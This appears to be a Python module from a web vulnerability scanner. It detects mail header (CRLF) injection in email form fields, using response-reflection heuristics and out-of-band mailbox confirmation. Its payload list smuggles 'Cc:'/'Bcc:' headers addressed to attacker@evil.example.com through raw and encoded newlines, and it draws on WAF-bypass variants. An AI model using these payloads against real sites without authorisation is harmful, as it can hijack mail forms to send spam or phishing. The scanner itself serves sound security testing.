"""
Mail Header Injection Scanner
Detects CRLF injection in email-related form fields (IPA: 1.8 メールヘッダ・インジェクション).

検知は 2 層構成:
  1. **ヒューリスティック**（OOB 不要）… 注入した CR/LF + Cc/Bcc ヘッダが応答へ
     そのまま反射する、またはメール構築エラーが漏えいする場合に検知する。
     ブラウザ経由の <input> では value sanitization で CR/LF が落ちることが多いが、
     URL パラメータや JSON/API 経路では成立し得る。
  2. **OOB（帯域外）確証**（``WSCAN_OOB_*`` 設定時）… 一意トークン宛の
     ``Bcc: <token>@<catch-all-domain>`` を注入し、対象アプリが実際に送った
     メールが OOB 受信箱へ届いたかをポーリングする。届けば「実際に外向きメールの
     ヘッダへ注入が反映された」確証となり、confidence=confirmed で記録する。

CR/LF が単純除去される素朴な防御に対しては、:func:`wscan.waf_bypass.crlf_bypass_variants`
が列挙する多様な改行表現（生 CR/LF・パーセント/二重エンコード・Unicode 行区切り・
オーバーロング UTF-8）でバイパスを試みる。
"""
import asyncio
import re
from typing import TYPE_CHECKING, Optional

from .base import BaseScanner, Finding
from ..waf_bypass import crlf_bypass_variants

if TYPE_CHECKING:
    from wscan.engine import ScanEngine


# Field-name hints suggesting the value is used in a mail header.
# Long hints are substring-matched; short tokens (to/cc/bcc/from/...) are
# matched as whole words only -- otherwise we'd test unrelated fields
# such as ``token``, ``totp``, ``photo``, ``account``, ``stockton``, etc.
_MAIL_SUBSTRING_HINTS = (
    "email", "e_mail", "mail",
    "subject", "reply_to", "replyto",
    "sender", "recipient",
)
_MAIL_TOKEN_HINTS = frozenset({
    "to", "from", "cc", "bcc",
    "mailto", "mail_to",
    "reply", "replyto",
})


def _field_name_suggests_mail(field_name: str) -> bool:
    name = (field_name or "").lower().replace("-", "_").replace(" ", "_")
    if not name:
        return False
    if any(hint in name for hint in _MAIL_SUBSTRING_HINTS):
        return True
    # Token-style match: split on underscore and dot to handle names like
    # ``contact.to`` or ``mail_cc1``.  Trailing digits are stripped so
    # ``cc1`` / ``bcc_2`` still match without making ``cc`` match ``account``.
    import re as _re
    parts = _re.split(r"[._]", name)
    for part in parts:
        stripped = part.rstrip("0123456789")
        if stripped in _MAIL_TOKEN_HINTS:
            return True
    return False


# Injection payloads — each embeds CRLF variants to split headers (反射検知用)
MAIL_INJECTION_PAYLOADS = [
    "test@example.com\r\nCc: attacker@evil.example.com",
    "test@example.com\nCc: attacker@evil.example.com",
    "test@example.com%0aCc: attacker@evil.example.com",
    "test@example.com%0d%0aCc: attacker@evil.example.com",
    "test@example.com\r\nBcc: attacker@evil.example.com",
    # Subject-oriented injection
    "Hello\r\nCc: attacker@evil.example.com",
    "Hello%0d%0aCc: attacker@evil.example.com",
]

# Response patterns that suggest mail-construction error leakage
MAIL_ERROR_PATTERNS = [
    r"mail\(\)\s*failed",
    r"sendmail.*error",
    r"SMTP\s+error",
    r"could not send.*mail",
    r"failed to send.*mail",
    r"invalid.*mail\s+header",
    r"header.*injection",
]

# Compiled pattern to detect raw CRLF + injected Cc/Bcc reflected in the response body
_REFLECTED_INJECTION_RE = re.compile(
    r"(?:\r\n|\n)\s*(?:Cc|Bcc|To|From):\s*attacker", re.IGNORECASE
)

# OOB 受信を待つ最大秒数 / ポーリング間隔（OOB 設定時のみ使用）
OOB_WAIT_SECONDS = 45.0
OOB_POLL_INTERVAL = 5.0


def reflection_payloads() -> list[str]:
    """反射/エラー検知フェーズで投入するペイロード群（標準 + CRLF バイパス変種）。

    標準セットに加え、``waf_bypass.crlf_bypass_variants`` の改行表現バリエーションで
    ``Cc: attacker@evil.example.com`` を注入する変種を重複なしで足す（純粋関数）。
    """
    out: list[str] = list(MAIL_INJECTION_PAYLOADS)
    seen = set(out)
    for payload, _desc in crlf_bypass_variants(
        "test@example.com", "Cc: attacker@evil.example.com"
    ):
        if payload not in seen:
            seen.add(payload)
            out.append(payload)
    return out


def oob_payloads(oob_address: str) -> list[str]:
    """OOB 確証フェーズで投入するペイロード群（純粋関数）。

    一意 OOB アドレス宛の ``Bcc: <addr>`` を、多様な改行表現で注入する。
    """
    if not oob_address:
        return []
    return [
        payload
        for payload, _desc in crlf_bypass_variants(
            "test@example.com", f"Bcc: {oob_address}"
        )
    ]


class MailHeaderInjectionScanner(BaseScanner):
    """Mail header injection scanner targeting email-related form fields (IPA 1.8)."""

    CHECK_TYPE = "mail_header"
    SEVERITY = "high"

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        field_name = field.get("name", "unknown")

        # Only test fields whose names suggest email header usage
        if not _field_name_suggests_mail(field_name):
            return []

        findings: list[Finding] = []

        if self.monitor:
            await self.monitor.emit_status(
                f"Mail header injection testing: {field_name} on {url}"
            )

        # ── フェーズ 1: 反射 / エラー漏えいのヒューリスティック検知 ──────────
        heuristic = await self._scan_reflection(
            url, form_index, field_name, is_url_param
        )
        findings.extend(heuristic)

        # ── フェーズ 2: OOB 確証（WSCAN_OOB_* 設定時のみ） ──────────────────
        oob = await self._scan_oob(url, form_index, field_name, is_url_param)
        if oob:
            findings.append(oob)

        return findings

    async def _scan_reflection(
        self,
        url: str,
        form_index: int,
        field_name: str,
        is_url_param: bool,
    ) -> list[Finding]:
        """注入した CR/LF + ヘッダの反射、またはメールエラー漏えいを検知する。"""
        for payload in reflection_payloads():
            await self.log_payload_test(field_name, payload, "mail_header", url)

            source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )
            await asyncio.sleep(0.2 * self.sleep_factor)

            # Check 1: mail-related error message in response (leaks unsanitised input)
            match = self.check_response_for_patterns(source, MAIL_ERROR_PATTERNS)
            if match:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        f"Possible mail header injection — mail error in response: '{match}'"
                    ),
                    pair=pair,
                    severity="high",
                    confidence="tentative",
                    evidence_type="mail_header_error",
                )
                return [finding] if finding else []

            # Check 2: raw CRLF + injected header reflected verbatim in HTML body
            if _REFLECTED_INJECTION_RE.search(source):
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        "Mail header injection: injected CRLF + Cc/Bcc header "
                        "reflected unescaped in the HTTP response body"
                    ),
                    pair=pair,
                    severity="high",
                    confidence="likely",
                    evidence_type="mail_header_reflected",
                )
                return [finding] if finding else []

        return []

    async def _scan_oob(
        self,
        url: str,
        form_index: int,
        field_name: str,
        is_url_param: bool,
    ) -> Optional[Finding]:
        """OOB メール受信で注入の実発火を確証する（OOB 未設定なら no-op）。"""
        new_addr = getattr(self.engine, "new_oob_address", None)
        if not callable(new_addr):
            return None
        issued = new_addr()
        if not issued:
            return None
        token, oob_addr = issued

        last_pair: dict = {}
        last_payload = ""
        for payload in oob_payloads(oob_addr):
            await self.log_payload_test(field_name, payload, "mail_header", url)
            _source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )
            last_pair = pair or last_pair
            last_payload = payload
            await asyncio.sleep(0.2 * self.sleep_factor)

        if not last_payload:
            return None

        if self.monitor:
            await self.monitor.emit_status(
                f"mail_header: waiting up to {OOB_WAIT_SECONDS:.0f}s for OOB mail ({token})"
            )

        sink = getattr(self.engine, "oob_sink", None)
        if sink is None:
            return None
        try:
            received = await asyncio.to_thread(
                sink.wait_for, token, OOB_WAIT_SECONDS, OOB_POLL_INTERVAL
            )
        except Exception as exc:
            self._note_wave_degradation("mail_oob", exc)
            return None

        if not received:
            return None

        return await self.record_finding(
            url=url,
            field_name=field_name,
            payload=last_payload,
            evidence=(
                "Mail header injection CONFIRMED via OOB: the application sent an "
                f"email whose injected Bcc reached the out-of-band mailbox (token {token})."
            ),
            pair=last_pair,
            severity="high",
            confidence="confirmed",
            evidence_type="mail_header_oob",
            evidence_details={
                "oob_token": token,
                "oob_address": oob_addr,
                "received_subject": received.subject,
                "received_to": received.to_addrs,
            },
        )

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] mail_header: _apply_payload failed on {field_name} @ {url}: {exc}"
                )
            return "", {}
